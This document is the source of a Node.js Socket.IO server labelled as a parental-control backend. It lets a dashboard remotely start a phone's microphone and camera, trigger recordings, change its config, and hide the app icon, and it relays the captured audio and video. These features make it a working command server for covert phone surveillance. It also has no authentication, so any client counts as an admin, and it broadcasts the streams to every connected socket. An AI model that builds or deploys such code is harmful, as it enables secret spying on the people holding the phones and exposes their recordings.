require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');

// Ensure uploads directory exists
const uploadsDir = path.join(__dirname, 'public', 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

const app = express();
const server = http.createServer(app);

// CORS Configuration
const allowedOrigins = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(',').map(origin => origin.trim())
  : ['*'];

const io = new Server(server, {
  cors: {
    origin: allowedOrigins.includes('*') ? '*' : allowedOrigins,
    methods: ["GET", "POST"],
    credentials: true
  },
  // CRITICAL: Aggressive ping/pong to keep connections alive
  // This helps with:
  // 1. Android Doze mode (kills idle connections)
  // 2. Render.com free tier timeout (30s inactivity)
  // 3. Detecting dead connections faster
  pingInterval: 10000,  // Send ping every 10 seconds
  pingTimeout: 5000,    // Wait 5 seconds for pong before disconnecting
  // Allow reconnection after temporary disconnects
  transports: ['websocket', 'polling'],
  // Upgrade timeout
  upgradeTimeout: 10000
});

// Middleware
app.use(compression());
app.use(helmet({
  contentSecurityPolicy: false, // Disable CSP for easier Socket.IO integration
  crossOriginEmbedderPolicy: false
}));
app.use(cors({
  origin: allowedOrigins.includes('*') ? '*' : allowedOrigins,
  credentials: true
}));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check endpoint for Render
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    version: '1.0.0'
  });
});

// API info endpoint
app.get('/api/info', (req, res) => {
  res.json({
    name: 'Parental Control Backend',
    version: '1.0.0',
    socketIO: true,
    endpoints: {
      health: '/health',
      root: '/',
      recordings: '/uploads'
    }
  });
});

// Device Management
const devices = new Map(); // deviceId -> { socketId, name, state }

io.on('connection', (socket) => {
  const type = socket.handshake.query.type;

  if (type === 'device') {
    const deviceId = socket.handshake.query.deviceId;
    const name = socket.handshake.query.name || 'Unknown Device';

    console.log(`📱 Device Connected: ${name} (${deviceId})`);

    devices.set(deviceId, {
      socketId: socket.id,
      name: name,
      connectedAt: new Date()
    });

    // Notify admins
    socket.broadcast.emit('device_list_update', Array.from(devices.entries()));

    socket.on('disconnect', () => {
      console.log(`📱 Device Disconnected: ${name}`);
      devices.delete(deviceId);
      socket.broadcast.emit('device_list_update', Array.from(devices.entries()));
    });
  } else {
    console.log('💻 Admin Dashboard Connected');
    // Send current list immediately
    socket.emit('device_list_update', Array.from(devices.entries()));

    socket.on('disconnect', () => {
      console.log('💻 Admin Disconnected');
    });
  }


  // Handle Audio Stream (from device)
  socket.on('audio_stream', (data) => {
    // Attach deviceId so frontend knows who sent it
    const deviceId = getDeviceIdBySocketId(socket.id);
    if (deviceId) {
      io.emit('audio_data', { deviceId, data });
    }
  });

  // Handle Video Stream
  socket.on('video_frame', (data) => {
    const deviceId = getDeviceIdBySocketId(socket.id);
    if (deviceId) {
      io.emit('video_data', { deviceId, data });
    }
  });


  // Handle Status Updates
  socket.on('status_update', (status) => {
    io.emit('server_log', 'App Status: ' + status); // Relay as log
  });

  // Helper to send to specific device
  const sendToDevice = (targetId, event, data = null) => {
    const device = devices.get(targetId);
    if (device && device.socketId) {
      io.to(device.socketId).emit(event, data);
    }
  };

  // Commands from web dashboard (now with targetId)
  socket.on('get_status', (targetId) => {
    if (targetId) sendToDevice(targetId, 'GET_STATUS');
    else socket.broadcast.emit('GET_STATUS'); // Fallback for old clients
  });

  socket.on('start_monitoring', (targetId) => {
    if (targetId) sendToDevice(targetId, 'START_AUDIO');
    else socket.broadcast.emit('START_AUDIO');
  });

  socket.on('stop_monitoring', (targetId) => {
    if (targetId) sendToDevice(targetId, 'STOP_AUDIO');
    else socket.broadcast.emit('STOP_AUDIO');
  });

  // New camera-first approach: dashboard requests, phone signals ready
  socket.on('request_camera_start', (targetId) => {
    console.log(`📷 Camera start requested for device: ${targetId}`);
    if (targetId) sendToDevice(targetId, 'REQUEST_CAMERA_START');
  });

  // Phone signals camera is ready
  socket.on('camera_ready', (deviceId) => {
    console.log(`✅ Camera ready from device: ${deviceId}`);
    socket.broadcast.emit('camera_ready', deviceId);
  });

  // Phone sends camera status updates
  socket.on('camera_status', (data) => {
    console.log(`📹 Camera status: ${data.status}`);
    socket.broadcast.emit('camera_status', data);
  });

  // Legacy support (kept for backwards compatibility)
  socket.on('start_video', (targetId) => {
    if (targetId) sendToDevice(targetId, 'START_CAM');
    else socket.broadcast.emit('START_CAM');
  });

  socket.on('stop_video', (targetId) => {
    if (targetId) sendToDevice(targetId, 'STOP_CAM');
    else socket.broadcast.emit('STOP_CAM');
  });

  socket.on('switch_camera', (targetId) => {
    if (targetId) sendToDevice(targetId, 'SWITCH_CAM');
    else socket.broadcast.emit('SWITCH_CAM');
  });

  // Video quality control
  socket.on('update_video_quality', (data) => {
    console.log(`📊 Video quality update: ${data.quality}`);
    if (data.targetId) sendToDevice(data.targetId, 'UPDATE_VIDEO_QUALITY', data);
  });

  socket.on('toggle_flash', (targetId) => {
    if (targetId) sendToDevice(targetId, 'TOGGLE_FLASH');
    else socket.broadcast.emit('TOGGLE_FLASH');
  });

  socket.on('toggle_front_flash', (targetId) => {
    if (targetId) sendToDevice(targetId, 'TOGGLE_FRONT_FLASH');
  });

  socket.on('toggle_back_flash', (targetId) => {
    if (targetId) sendToDevice(targetId, 'TOGGLE_BACK_FLASH');
  });

  // Hide/Show app icon remotely  
  socket.on('hide_app', (targetId) => {
    console.log(`🙈 Hide app icon requested for: ${targetId}`);
    if (targetId) sendToDevice(targetId, 'HIDE_APP');
  });

  socket.on('show_app', (targetId) => {
    console.log(`👁️ Show app icon requested for: ${targetId}`);
    if (targetId) sendToDevice(targetId, 'SHOW_APP');
  });

  socket.on('brightness_up', (targetId) => {
    if (targetId) sendToDevice(targetId, 'BRIGHTNESS_UP');
    else socket.broadcast.emit('BRIGHTNESS_UP');
  });

  socket.on('brightness_down', (targetId) => {
    if (targetId) sendToDevice(targetId, 'BRIGHTNESS_DOWN');
    else socket.broadcast.emit('BRIGHTNESS_DOWN');
  });

  socket.on('START_MANUAL_RECORDING', (targetId) => {
    if (targetId) sendToDevice(targetId, 'START_MANUAL_RECORDING');
  });

  socket.on('STOP_MANUAL_RECORDING', (targetId) => {
    if (targetId) sendToDevice(targetId, 'STOP_MANUAL_RECORDING');
  });

  // Remote config management
  socket.on('update_config', (data) => {
    // data = { targetId, config }
    console.log('[Server] Config update:', data);
    if (data.targetId) {
      sendToDevice(data.targetId, 'UPDATE_CONFIG', data.config);
    } else {
      // Fallback or broadcast
      socket.broadcast.emit('UPDATE_CONFIG', data);
    }
  });

  socket.on('get_config', (targetId) => {
    if (targetId) sendToDevice(targetId, 'GET_CONFIG');
  });

  socket.on('get_storage_stats', (targetId) => {
    if (targetId) sendToDevice(targetId, 'GET_STORAGE_STATS');
  });

  socket.on('hide_app_icon', (targetId) => {
    if (targetId) sendToDevice(targetId, 'HIDE_APP_ICON');
  });

  socket.on('show_app_icon', (targetId) => {
    if (targetId) sendToDevice(targetId, 'SHOW_APP_ICON');
  });

  socket.on('get_permissions', (targetId) => {
    if (targetId) sendToDevice(targetId, 'GET_PERMISSIONS');
  });

  socket.on('permission_report', (data) => {
    // Relay to dashboard
    const deviceId = getDeviceIdBySocketId(socket.id);
    if (deviceId) {
      io.emit('permission_report', { deviceId, report: data });
    }
  });

  socket.on('current_config', (config) => {
    socket.broadcast.emit('current_config', config);
  });

  socket.on('storage_stats', (stats) => {
    socket.broadcast.emit('storage_stats', stats);
  });

  // ============= Heartbeat for Connection Keep-Alive =============
  // Prevents Render.com free tier from sleeping (30s timeout)
  // Also helps detect stale connections on mobile devices
  socket.on('heartbeat', (timestamp) => {
    // Respond with pong to let client know connection is alive
    socket.emit('pong_response', {
      serverTime: Date.now(),
      clientTime: timestamp,
      latency: Date.now() - timestamp
    });

    // Update device's last seen time if it's a device
    const deviceId = getDeviceIdBySocketId(socket.id);
    if (deviceId && devices.has(deviceId)) {
      const device = devices.get(deviceId);
      device.lastSeen = new Date();
      devices.set(deviceId, device);
    }
  });

  // Log relay from device to dashboard
  socket.on('log', (message) => {
    const deviceId = getDeviceIdBySocketId(socket.id);
    io.emit('server_log', `[${deviceId || 'unknown'}] ${message}`);
  });

  // ============= WebRTC Signaling Pass-Through =============
  // Modified to route to specific device or admin
  socket.on('webrtc_offer', (data) => { // data = { targetId, offer } OR just offer
    const payload = typeof data === 'string' ? JSON.parse(data) : data;
    // If from admin to device
    if (payload.targetId) {
      sendToDevice(payload.targetId, 'webrtc_offer', JSON.stringify(payload.offer || payload));
    } else {
      // From device to admin
      socket.broadcast.emit('webrtc_offer', data);
    }
  });

  socket.on('webrtc_answer', (data) => {
    // Typically from device to admin
    socket.broadcast.emit('webrtc_answer', data);
  });

  socket.on('webrtc_ice_candidate', (data) => {
    // Relay to specific target if possible, otherwise broadcast
    let payload = data;
    try {
      if (typeof data === 'string') payload = JSON.parse(data);
    } catch (e) { }

    if (payload.targetId) {
      // Send ONLY the candidate part to the device (as it expects)
      // The device expects a JSON string of the candidate object
      const candidateStr = typeof payload.candidate === 'string' ? payload.candidate : JSON.stringify(payload.candidate);
      sendToDevice(payload.targetId, 'webrtc_ice_candidate', candidateStr);
    } else {
      // Broadcast (fallback for device -> admin or older clients)
      socket.broadcast.emit('webrtc_ice_candidate', data);
    }
  });
});

function getDeviceIdBySocketId(socketId) {
  for (let [id, device] of devices.entries()) {
    if (device.socketId === socketId) return id;
  }
  return null;
}

const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📂 Environment: ${NODE_ENV}`);
  console.log(`📁 Uploads directory: ${uploadsDir}`);
  console.log(`🌐 CORS origins: ${allowedOrigins.join(', ')}`);
});

// Error handling
server.on('error', (error) => {
  if (error.code === 'EADDRINUSE') {
    console.error(`❌ Port ${PORT} is already in use`);
    process.exit(1);
  } else {
    console.error('❌ Server error:', error);
    process.exit(1);
  }
});

// Graceful shutdown
const gracefulShutdown = (signal) => {
  console.log(`\n${signal} received. Closing server gracefully...`);

  server.close(() => {
    console.log('✅ HTTP server closed');

    io.close(() => {
      console.log('✅ Socket.IO server closed');
      process.exit(0);
    });
  });

  // Force close after 10 seconds
  setTimeout(() => {
    console.error('⚠️ Forced shutdown after timeout');
    process.exit(1);
  }, 10000);
};

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

function createWavHeader(dataLength) {
  const buffer = Buffer.alloc(44);

  // RIFF chunk descriptor
  buffer.write('RIFF', 0);
  buffer.writeUInt32LE(36 + dataLength, 4);
  buffer.write('WAVE', 8);

  // fmt sub-chunk
  buffer.write('fmt ', 12);
  buffer.writeUInt32LE(16, 16); // Subchunk1Size (16 for PCM)
  buffer.writeUInt16LE(1, 20);  // AudioFormat (1 for PCM)
  buffer.writeUInt16LE(1, 22);  // NumChannels (1 for Mono)
  buffer.writeUInt32LE(44100, 24); // SampleRate
  buffer.writeUInt32LE(44100 * 2, 28); // ByteRate (SampleRate * BlockAlign)
  buffer.writeUInt16LE(2, 32);  // BlockAlign (NumChannels * BitsPerSample/8)
  buffer.writeUInt16LE(16, 34); // BitsPerSample

  // data sub-chunk
  buffer.write('data', 36);
  buffer.writeUInt32LE(dataLength, 40);

  return buffer;
}
